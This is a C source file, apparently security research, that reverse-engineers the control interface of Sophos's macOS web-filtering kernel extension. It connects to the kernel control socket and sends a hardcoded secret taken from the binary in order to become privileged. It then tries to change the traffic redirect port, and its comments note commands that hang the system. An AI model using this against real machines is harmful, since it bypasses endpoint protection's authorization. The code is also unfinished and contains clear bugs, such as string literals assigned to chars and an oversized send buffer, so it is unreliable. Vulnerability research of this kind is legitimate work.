#include <stdio.h>
#include <strings.h> // For bzero
#include <sys/socket.h>
#include <sys/sys_domain.h>
#include <sys/kern_control.h>
#include <sys/ioctl.h>
#include <unistd.h>

// enum sopt_dir { SOPT_GET, SOPT_SET };
#define OAS_SET_CHARDEV_PING        0
#define OAS_SET_MEMCPY              1
#define OAS_SET_SECRET_KEY          2
#define OAS_SET_IMMEDIATE_EXIT      3
#define OAS_SET_LOG_LEVEL           4
#define OAS_SET_DIAGNOSTICS_ENABLE  5

#define OAS_GET_KEXT_SCHEMA_LEVEL   1
#define OAS_GET_KEXT_LOG_LEVEL      2

#define SWI_SET_REDIRECT_PORT       0 // Must be counterpart
#define SWI_SET_TRUSTED_IP_ADDR     1 // Must be counterpart
#define SWI_SET_SOCKETINFO_POTENT   2 // Must be counterpart -- needs an opval with size of 128
#define SWI_SET_COUNTERPART_DAEMON  3 // Must not have a counter part, must be privledged -- SophosWebIntelligence process steals this
#define SWI_SET_LOG_LEVEL           4 // Set log level to whatever opt passed in is for, must be done via root
#define SWI_SET_SECRET              5 // Set SECRET to whatever opt passed in is, must be privledged, but not root
#define SWI_SET_BECOME_PRIVLEDGED   6 // Must send the correct code to be compared - which was set by SWI_SET_SECRET
#define SWI_SET_MUTATE_INPUT_OR_1   7
#define SWI_SET_MUTATE_INPUT_OR_2   8
#define SWI_SET_WANT_HEARTBEAT      9 // Must be privledged
#define SWI_SET_DELIVER_TO_PROXY    10 // Must be privledged
#define SWI_SET_DIAGNOSTICS_ENABLED 11 // No privledged needed

// XXX: Investigate more
// Seems to cause Illegal instruction 4 and also Segementation fault 11
#define SWI_GET_SOCKET_INFO        0 // Causes hard system hang
/*
 * Pass this as the command, also
 * pass in an empty size_t object which
 * will be returned with the port number
 */
#define SWI_GET_REDIRECT_PORT      1
/*
 * Pass this as the command, also
 * pass in an empty size_t object which
 * will be returned with the log level value
 */
#define SWI_GET_KEXT_LOG_LEVEL     2
/*
 * Pass this as the command, also
 * pass in an empty size_t object which
 * will be returned with the schema value
 */
#define SWI_GET_KEXT_SCHEMA_LEVEL  3
/*
 * Pass this as the command, also
 * pass in an empty size_t object which
 * will be returned with the mbuf queue size
 */
#define SWI_GET_KEXT_MBUF_QUEUE    4

int main() {
  int result = -1;

  printf("[\033[0;32m*\033[0m] Sophos fun...\n");

  // Create a socket
  int fd = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL);
  if (fd != -1) {
    // Initialize the address structure
    struct sockaddr_ctl addr;
    bzero(&addr, sizeof(addr));
    addr.sc_len = sizeof(addr);
    addr.sc_family = AF_SYSTEM;
    addr.ss_sysaddr = AF_SYS_CONTROL;

    // create and initialize the info structure
    struct ctl_info info;
    bzero(&info, sizeof(info));
    
    // Web sockets : com.sophos.nke.swi
    // OaS: com.sophos.kext.oas
    //strncpy(info.ctl_name, "com.sophos.kext.oas", sizeof(info.ctl_name));
    strncpy(info.ctl_name, "com.sophos.nke.swi", sizeof(info.ctl_name));
    //result = ioctl(fd, CTLIOCGINFO, &info);
    result = ioctl(fd, 0x0C0644E03, &info);
    if (result) {
      printf("[\033[0;31m!\033[0m] Could not get ID for kernel control.\n");
    } else {

      // Set address socket id
      addr.sc_id = info.ctl_id;
      addr.sc_unit = 0xFF;

      // Connect to the socket
      result = connect(fd, (struct sockaddr *)&addr, sizeof(addr));
      if (result) {
	fprintf(stderr, "[\033[0;31m!\033[0m] connect failed %d\n", result);
      } else {
	printf("[\033[0;32m+\033[0m] result = 0x%02x\n", result);
	// getsockopt swi command 3 for getting expected schema : returns 6
	// getsockopt oas command 1 for getting expected schema : returns 7
	size_t o;
	bzero(&o, sizeof(o));
	socklen_t len = sizeof(size_t);
	result = getsockopt(fd, SO_ACCEPTCONN, SWI_GET_REDIRECT_PORT, &o, &len);
	if (result){
	  fprintf(stderr, "[\033[0;31m!\033[0m] getsockopt failed on cmd call - result was %d\n", result);
	} else {
	  printf("[\033[0;32m+\033[0m] getsockopt success - redirect port : 0x%02x\n", o);
	}
      }

      /*
      // Unknown is this stuff would ever work...
      struct kctl *kctl_object = ctl_find_by_name(info.ctl_name);
      printf("_kctl = 0x%02x\n", _kctl);
      struct ctl_cb *_ctl_cb = kcd_find(_kctl, 0x00);
      printf("_ctlb_cb = 0x%02x\n", _ctl_cb);
      */
      
      char *temp = "XXXXXXXXtestiXgtestXng";
      char *send_data = malloc(strlen(temp) + 1);
      // A9A700A500000007
      //         00000007
      send_data[0] = 0x07;
      send_data[1] = 0x00;
      send_data[2] = 0x00;
      send_data[3] = 0x00;
      send_data[4] = 0x00;
      send_data[6] = 0x00;
      send_data[7] = 0x00;
      send_data[8] = 0x00;
      send_data[9] = 0x00;
      send_data[10] = "e";
      send_data[11] = "s";
      send_data[12] = "t";
      send_data[13] = "i";
      send_data[14] = "n";
      send_data[15] = "Z";
      send_data[16] = "t";
      send_data[17] = "e";
      send_data[18] = "s";
      send_data[19] = "f";
      send_data[20] = "u";
      send_data[21] = "c";
      send_data[22] = "k";
      send_data[23] = 0x00;
      int i = 0;
      //      for(int i = 0; i < 10; i++) { 
      int out = send(fd, send_data, 34/*strlen(send_data)*/, i);
      //int out = send(fd, temp, strlen(temp), i);
	printf("%d *** 0x%02x bytes written\n", i, out);
	//      }

      // Value of this is found at $base + 0x21BE being used as a memcmp
      char *secret_stuff = "secret12";
      char *secret = malloc(strlen(secret_stuff) + 1);
      //      0xba5c8565 0xdf6f9177
      secret[3] = 0xba;
      secret[2] = 0x5c;
      secret[1] = 0x85;
      secret[0] = 0x65;
      secret[7] = 0xdf;
      secret[6] = 0x6f;
      secret[5] = 0x91;
      secret[4] = 0x77;
      //socklen_t len = sizeof(secret);

      int optval;
      int optlen;
      //      char *optval2;
      optval = 123;
      printf("Using fd %02x\n", fd);
      //      setsockopt(fd, SOL_SOCKET, 1, secret, len);
      result = setsockopt(fd, SYSPROTO_CONTROL, SWI_SET_BECOME_PRIVLEDGED, secret, strlen(secret));
      if (result){
	fprintf(stderr, "[\033[0;31m!\033[0m] setsockopt failed on cmd call - result was %d\n", result);
      } else {
	printf("[\033[0;32m+\033[0m] setsockopt success : 0x%02x\n", result);
      }
      result = setsockopt(fd, SYSPROTO_CONTROL, SWI_SET_REDIRECT_PORT, secret, strlen(secret));
      if (result){
	fprintf(stderr, "[\033[0;31m!\033[0m] setsockopt failed on cmd call - result was %d\n", result);
      } else {
	printf("[\033[0;32m+\033[0m] setsockopt success : 0x%02x\n", result);
      }

      out = send(fd, send_data, 34/*strlen(send_data)*/, i);
      printf("%d *** 0x%02x bytes written\n", i, out);
    }
    printf("[\033[0;32m-\033[0m] Closing socket...\n");
    if(close(fd)) {
      fprintf(stderr, "[\033[0;31m!\033[0m] close failed\n");
    }
  }
  printf("[\033[0;32m-\033[0m] Done...\n");
}
